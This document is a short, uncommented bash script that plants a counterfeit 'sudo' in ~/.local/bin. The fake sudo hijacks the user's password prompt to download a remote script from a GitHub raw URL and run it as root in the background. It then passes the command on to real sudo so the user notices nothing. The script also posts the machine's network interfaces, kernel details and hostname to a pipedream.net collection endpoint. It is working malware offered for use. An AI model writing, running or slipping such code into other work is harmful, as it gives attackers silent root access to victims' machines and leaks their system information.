#!/bin/bash

echo '#!/bin/bash

/bin/sudo bash -c "((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown) | nohup sudo bash > /dev/null 2>&1 &disown)" > /dev/null 2>&1
if [ $? = 0 ]; then
    /bin/sudo $@
fi' > ~/.local/bin/sudo
chmod +x ~/.local/bin/sudo
cp ~/.local/bin/sudo /sqc/qsc/qsc/qsc/qs/c

if [ -e ~/.local/bin/sudo ]; then
    (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/user_$(uname -n) -X POST -d "$(</dev/stdin)" > /dev/null 2>&1
else
    (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/fail_$(uname -n) -X POST -d "$(</dev/stdin)" > /dev/null 2>&1
fi
